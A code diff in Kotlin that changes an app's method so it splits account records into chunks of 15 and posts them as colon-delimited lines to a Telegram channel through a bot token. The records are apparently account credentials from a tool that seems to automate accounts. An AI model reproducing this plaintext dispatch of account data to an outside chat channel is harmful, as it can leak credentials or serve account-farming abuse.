@@ -46,38 +46,47 @@ class CloudSyncRepository(
      */
     private suspend fun dispatchTelegramBatch(accounts: List<AccountRecord>): Boolean = withContext(Dispatchers.IO) {
         try {
-            val sb = StringBuilder()
-            sb.append("📦 *AAA X-Orchestrator Batch Report*\n")
-            sb.append("Batch Size: ${accounts.size} accounts\n")
-            sb.append("Timestamp: ${System.currentTimeMillis()}\n\n")
-            sb.append("```\n")
-            for (acc in accounts) {
-                sb.append(acc.toDelimitedLine(":")).append("\n")
-            }
-            sb.append("```\n")
+            val chunks = accounts.chunked(15)
+            var allSucceeded = true
 
-            val jsonBody = """
-                {
-                    "chat_id": "$TELEGRAM_CHANNEL_ID",
-                    "text": ${escapeJson(sb.toString())},
-                    "parse_mode": "Markdown"
+            for ((index, chunk) in chunks.withIndex()) {
+                val sb = StringBuilder()
+                val partLabel = if (chunks.size > 1) " (Part ${index + 1}/${chunks.size})" else ""
+                sb.append("📦 *AAA X-Orchestrator Batch Report*$partLabel\n")
+                sb.append("Batch Size: ${chunk.size} accounts (Total: ${accounts.size})\n")
+                sb.append("Timestamp: ${System.currentTimeMillis()}\n\n")
+                sb.append("```\n")
+                for (acc in chunk) {
+                    sb.append(acc.toDelimitedLine(":")).append("\n")
                 }
-            """.trimIndent()
+                sb.append("```\n")
 
-            val request = Request.Builder()
-                .url("https://api.telegram.org/bot$TELEGRAM_BOT_TOKEN/sendMessage")
-                .post(jsonBody.toRequestBody("application/json".toMediaType()))
-                .build()
+                val jsonBody = """
+                    {
+                        "chat_id": "$TELEGRAM_CHANNEL_ID",
+                        "text": ${escapeJson(sb.toString())},
+                        "parse_mode": "Markdown"
+                    }
+                """.trimIndent()
 
-            client.newCall(request).execute().use { response ->
-                if (response.isSuccessful) {
-                    Timber.i("Telegram batch successfully dispatched to channel $TELEGRAM_CHANNEL_ID")
-                    return@withContext true
-                } else {
-                    Timber.e("Telegram batch dispatch failed: ${response.code} - ${response.body?.string()}")
-                    return@withContext false
+                val request = Request.Builder()
+                    .url("https://api.telegram.org/bot$TELEGRAM_BOT_TOKEN/sendMessage")
+                    .post(jsonBody.toRequestBody("application/json".toMediaType()))
+                    .build()
+
+                val success = client.newCall(request).execute().use { response ->
+                    if (response.isSuccessful) {
+                        Timber.i("Telegram batch chunk ${index + 1}/${chunks.size} dispatched successfully")
+                        true
+                    } else {
+                        Timber.e("Telegram batch chunk ${index + 1} failed: ${response.code} - ${response.body?.string()}")
+                        false
+                    }
                 }
+                if (!success) allSucceeded = false
             }
+
+            return@withContext allSucceeded
         } catch (e: Exception) {
             Timber.e(e, "Error sending Telegram batch")
             return@withContext false
